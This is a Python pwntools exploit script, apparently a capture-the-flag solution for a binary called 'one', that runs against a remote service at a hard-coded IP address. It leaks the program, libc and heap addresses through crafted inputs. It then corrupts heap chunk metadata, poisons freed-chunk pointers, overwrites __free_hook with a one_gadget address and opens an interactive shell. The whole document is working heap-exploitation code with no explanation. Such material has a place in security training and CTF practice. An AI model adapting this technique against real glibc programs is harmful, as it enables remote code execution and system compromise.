from pwn import *
from time import sleep
import string
context.binary = "./one"
#  context.log_level = 'debug'
elf = ELF('./one', checksec = False)
libc = elf.libc
libc.sym['main_arena'] = 0x3ebc40
libc.sym['one_gadget'] = 0x4f322

local = False
if local:
    #  io = process(elf.path, aslr = False)
    io = process(elf.path)
else:
    #  io = remote('', 1337)
    io = remote("117.78.48.182", 30774)

def DEBUG():
    gdbcmd = '''
    bpie 0x13D8
    bpie 0x1568
    c
    '''
    gdb.attach(io, gdbscript = gdbcmd)
    #  pause()

def leak():
    io.recvuntil("command>> \n")
    io.sendline('12580')
    io.recvuntil("(Y/N)\n")
    io.sendline('Y')
    io.recvuntil("test?\n")
    io.sendline(str(0x80000000))
    io.recvuntil(":\n")
    elf.address = u64(io.recvuntil("\n", drop = True).ljust(8, '\0')) - 0x2030c0
    success("elf @ {:#x}".format(elf.address))

def add(s):
    io.recvuntil("command>> \n")
    io.sendline('1')
    io.recvuntil("string:\n")
    if len(s) < 0x20:
        io.sendline(s)
    else:
        io.send(s)
        sleep(0.01)

def show(id_):
    io.recvuntil("command>> \n")
    io.sendline('3')
    io.recvuntil("string:\n")
    io.sendline(str(id_))

def delete(id_):
    io.recvuntil("command>> \n")
    io.sendline('4')
    io.recvuntil("string:\n")
    io.sendline(str(id_))

def edit(id_, b1, b2):
    io.recvuntil("command>> \n")
    io.sendline('2')
    io.recvuntil("string:\n")
    io.sendline(str(id_))
    io.recvuntil("edit:\n")
    if b1 == '\0':
        io.send('\0')
    else:
        io.send(p16(ord(b1)))
    sleep(0.01)
    io.recvuntil("into:\n")
    io.sendline(b2)

leak()

add('0' * 0x20)
add('1' * 0x20)
add('2' * 0x20)
add('3' * 0x20)
ptr = elf.address + 0x2030e0
#  payload = flat('4' * 0x18, ptr - 0x10)
payload = flat('abcdefghijklmnopqrstzvwx', ptr - 0x10)
#  add('4' * 0x20)
add(payload)
add('5' * 0x20)
add('6' * 0x20)
add('7' * 0x20)
add('8' * 0x20)
payload = flat('99999999', 0x41)
add(payload)
#  add('9' * 0x20)
add('a' * 0x20)
add('b' * 0x20)
add('c' * 0x20)
add('d' * 0x20)
add('e' * 0x20)
add('f' * 0x20)
add('g' * 0x20)
add('h' * 0x20)
add('i' * 0x20)

padding = string.printable[: 0x1e]
for i in padding:
    edit(0, '\0', i)
edit(0, "\x41", "\x41")
edit(0, '\x6f', "\x04")
for i in padding[::-1][: 5] + padding[::-1][6: 6 + 8]:
    edit(0, i, '\0')

delete(1)
add('j' * 8)
show(2)
io.recvuntil(":\n")
libc.address = u64(io.recvn(6) + '\0\0') - libc.sym['main_arena'] - 96
success("libc @ {:#x}".format(libc.address))

padding1 = string.printable[: 0x10]
for i in padding1:
    edit(6, '\0', i)
edit(6, '\0', '\xb0')
padding2 = string.printable[0x10: 0x10 + 7]
for i in padding2:
    edit(6, '\0', i)
edit(6, '\x41', '\x90')
for i in padding2[::-1]:
    edit(6, i, '\0')

#  payload = flat('abcdefghijklmnopqrstuvwx', ptr - 0x10)
fake_fd = flat(ptr - 0x18)
idx = 0
for i in 'qrstzv':
    edit(4, i, fake_fd[idx])
    idx += 1
for i in 'xw':
    edit(4, i, '\0')

fake_size = p8(0xb1)
edit(4, '\x69', fake_size)
for i in 'jklmnop'[::-1]:
    edit(4, i, '\0')
for i in 'abcdefgh'[::-1]:
    edit(4, i, '\0')

for i in xrange(7):
    for j in xrange(0x18):
        edit(10 + i, '\0', 'x')
    edit(10 + i, '\x41', '\x91')
for i in xrange(7):
    delete(11 + i)

delete(7)

show(4)
io.recvuntil(":\n")
heap = io.recvuntil("\n", drop = True)
success("heap @ {:#x}".format(u64(heap + '\0\0')))

__free_hook = flat(libc.sym['__free_hook'])
success("__free_hook @ {:#x}".format(libc.sym['__free_hook']))
idx = 0
for i in heap:
    edit(4, i, __free_hook[idx])
    idx += 1
    #  print("{} -> {}".format(i.encode('hex'), __free_hook[idx].encode('hex')))

#  system = flat(libc.sym['system'])
system = flat(libc.sym['one_gadget'])
for i in system:
    edit(1, '\0', i)

#  DEBUG()
delete(0)


io.interactive()
